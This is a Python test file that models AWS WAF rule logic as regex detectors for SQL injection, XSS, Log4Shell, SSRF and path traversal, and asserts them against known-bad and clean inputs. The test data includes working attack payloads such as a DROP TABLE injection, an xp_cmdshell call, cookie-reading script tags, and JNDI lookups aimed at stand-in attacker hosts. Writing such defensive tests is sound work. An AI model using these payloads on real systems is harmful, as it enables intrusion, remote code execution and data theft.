"""
AWS WAF Rule Logic Tests

These tests validate that the pattern-detection functions used to model WAF behaviour
correctly identify attack payloads.  They are NOT unit tests of the Lambda app —
they are functional tests of WAF rule logic.

Because we cannot call WAF directly in CI, we model the rule behaviour as pure
Python functions and assert their outputs against known-good and known-bad payloads.

Run with:
    pytest tests/test_waf_rules.py -v
"""

import re
import pytest


###############################################################################
# WAF Rule Logic Helpers
###############################################################################

# SQL injection patterns modelled after AWSManagedRulesSQLiRuleSet
_SQLI_PATTERNS = re.compile(
    r"""
    (?: UNION\s+(?:ALL\s+)?SELECT )     # UNION (ALL) SELECT
  | (?: OR\s+\d+\s*=\s*\d+ )           # OR 1=1 / OR 1=2
  | (?: '\s*OR\s*'\w+'\s*=\s*'\w+ )    # ' OR 'a'='a
  | (?: --\s*$ )                        # trailing SQL comment
  | (?: /\*.*?\*/ )                     # inline comment
  | (?: ;\s*DROP\s+TABLE )              # ; DROP TABLE
  | (?: INSERT\s+INTO\s+\w+ )          # INSERT INTO
  | (?: SELECT\s+.*\s+FROM\s+\w+ )     # SELECT ... FROM
  | (?: DELETE\s+FROM\s+\w+ )          # DELETE FROM
  | (?: UPDATE\s+\w+\s+SET\s+ )        # UPDATE ... SET
  | (?: EXEC(?:UTE)?\s*\( )            # EXEC(
  | (?: xp_cmdshell )                   # SQL Server RCE
    """,
    re.IGNORECASE | re.VERBOSE,
)

# XSS patterns modelled after AWSManagedRulesCommonRuleSet
_XSS_PATTERNS = re.compile(
    r"""
    <\s*script[^>]*>                   # <script ...>
  | javascript\s*:                      # javascript:
  | on(?:error|load|click|mouseover|focus|blur|input|change)\s*= # onerror= etc.
  | <\s*iframe[^>]*>                   # <iframe>
  | <\s*img[^>]+onerror                # <img onerror=
  | expression\s*\(                    # CSS expression()
  | vbscript\s*:                       # vbscript:
    """,
    re.IGNORECASE | re.VERBOSE,
)

# Known bad inputs modelled after AWSManagedRulesKnownBadInputsRuleSet
_KNOWN_BAD_PATTERNS = re.compile(
    r"""
    \$\{jndi:                          # Log4Shell (CVE-2021-44228)
  | \$\{lower:                         # Log4Shell obfuscation
  | \$\{::-j\}                         # Log4Shell obfuscation variant
  | file:///etc/passwd                 # Local file inclusion
  | /etc/shadow                        # LFI sensitive file
  | \.\.\/\.\.\/                       # Path traversal ../../
  | %2e%2e%2f                          # URL-encoded path traversal
  | http://169\.254\.169\.254          # AWS metadata SSRF
  | http://metadata\.google\.internal  # GCP metadata SSRF
  | http://100\.100\.100\.200          # Alibaba metadata SSRF
    """,
    re.IGNORECASE | re.VERBOSE,
)


def is_sqli_payload(payload: str) -> bool:
    """
    Return True if the payload contains SQL injection patterns
    consistent with what AWSManagedRulesSQLiRuleSet would flag.

    Args:
        payload: Raw request string (URL, body, header value, etc.)

    Returns:
        True if a SQLi pattern is detected; False otherwise.
    """
    return bool(_SQLI_PATTERNS.search(payload))


def is_xss_payload(payload: str) -> bool:
    """
    Return True if the payload contains XSS patterns consistent
    with what AWSManagedRulesCommonRuleSet would flag.

    Args:
        payload: Raw request string.

    Returns:
        True if an XSS pattern is detected; False otherwise.
    """
    return bool(_XSS_PATTERNS.search(payload))


def is_known_bad_input(payload: str) -> bool:
    """
    Return True if the payload matches Log4Shell, SSRF, path traversal,
    or other known-bad inputs that AWSManagedRulesKnownBadInputsRuleSet
    would catch.

    Args:
        payload: Raw request string.

    Returns:
        True if a known-bad pattern is detected; False otherwise.
    """
    return bool(_KNOWN_BAD_PATTERNS.search(payload))


###############################################################################
# Test Class
###############################################################################

class TestWAFRuleLogic:
    """Functional tests for WAF rule pattern detection."""

    # ------------------------------------------------------------------
    # SQL Injection tests
    # ------------------------------------------------------------------

    def test_sqli_union_select_is_flagged(self):
        assert is_sqli_payload("' UNION SELECT username, password FROM users--") is True

    def test_sqli_union_all_select_is_flagged(self):
        assert is_sqli_payload("1' UNION ALL SELECT NULL, NULL, NULL--") is True

    def test_sqli_or_one_equals_one_is_flagged(self):
        assert is_sqli_payload("admin' OR 1=1--") is True

    def test_sqli_or_numeric_variant_is_flagged(self):
        assert is_sqli_payload("' OR 2=2 #") is True

    def test_sqli_drop_table_is_flagged(self):
        assert is_sqli_payload("'; DROP TABLE users; --") is True

    def test_sqli_select_from_is_flagged(self):
        assert is_sqli_payload("SELECT * FROM orders WHERE id=1") is True

    def test_sqli_insert_into_is_flagged(self):
        assert is_sqli_payload("INSERT INTO users (name, role) VALUES ('hacker', 'admin')") is True

    def test_sqli_xp_cmdshell_is_flagged(self):
        assert is_sqli_payload("'; EXEC xp_cmdshell('whoami'); --") is True

    def test_sqli_clean_search_query_is_not_flagged(self):
        assert is_sqli_payload("search=laptop&category=electronics") is False

    def test_sqli_clean_json_body_is_not_flagged(self):
        assert is_sqli_payload('{"username": "alice", "email": "alice@example.com"}') is False

    def test_sqli_plain_text_is_not_flagged(self):
        assert is_sqli_payload("Hello, world! This is a safe request.") is False

    def test_sqli_numeric_id_is_not_flagged(self):
        assert is_sqli_payload("id=42&page=3") is False

    # ------------------------------------------------------------------
    # XSS tests
    # ------------------------------------------------------------------

    def test_xss_script_tag_is_flagged(self):
        assert is_xss_payload("<script>alert('xss')</script>") is True

    def test_xss_script_tag_with_attrs_is_flagged(self):
        assert is_xss_payload("<script type='text/javascript'>document.cookie</script>") is True

    def test_xss_javascript_protocol_is_flagged(self):
        assert is_xss_payload("<a href='javascript:alert(1)'>click me</a>") is True

    def test_xss_onerror_attr_is_flagged(self):
        assert is_xss_payload("<img src=x onerror=alert('xss')>") is True

    def test_xss_onload_attr_is_flagged(self):
        assert is_xss_payload("<body onload=alert('xss')>") is True

    def test_xss_onclick_attr_is_flagged(self):
        assert is_xss_payload("<div onclick=doEvil()>") is True

    def test_xss_iframe_is_flagged(self):
        assert is_xss_payload("<iframe src='https://evil.example'></iframe>") is True

    def test_xss_clean_html_paragraph_is_not_flagged(self):
        assert is_xss_payload("<p>Welcome to the site.</p>") is False

    def test_xss_clean_html_link_is_not_flagged(self):
        assert is_xss_payload("<a href='https://example.com'>Visit us</a>") is False

    def test_xss_plain_text_is_not_flagged(self):
        assert is_xss_payload("My name is Bob and I like Python.") is False

    def test_xss_markdown_is_not_flagged(self):
        assert is_xss_payload("# Heading\n\nSome **bold** text.") is False

    # ------------------------------------------------------------------
    # Known Bad Inputs tests
    # ------------------------------------------------------------------

    def test_log4j_jndi_ldap_is_detected(self):
        assert is_known_bad_input("${jndi:ldap://evil.example/a}") is True

    def test_log4j_jndi_rmi_is_detected(self):
        assert is_known_bad_input("${jndi:rmi://attacker.example/exploit}") is True

    def test_log4j_user_agent_variant_is_detected(self):
        assert is_known_bad_input(
            "User-Agent: ${jndi:ldap://192.0.2.1:1389/Exploit}"
        ) is True

    def test_log4j_lower_obfuscation_is_detected(self):
        assert is_known_bad_input("${lower:${lower:j}}ndi:ldap://attacker/a") is True

    def test_ssrf_aws_metadata_is_detected(self):
        assert is_known_bad_input("url=http://169.254.169.254/latest/meta-data/") is True

    def test_path_traversal_dotdot_is_detected(self):
        assert is_known_bad_input("../../etc/passwd") is True

    def test_lfi_etc_passwd_is_detected(self):
        assert is_known_bad_input("file:///etc/passwd") is True

    def test_clean_url_is_not_detected(self):
        assert is_known_bad_input("https://api.example.com/v1/items?id=5") is False

    def test_clean_user_agent_is_not_detected(self):
        assert is_known_bad_input("Mozilla/5.0 (compatible; MyBot/1.0)") is False

    def test_clean_json_payload_is_not_detected(self):
        assert is_known_bad_input('{"action": "get", "resource": "orders"}') is False
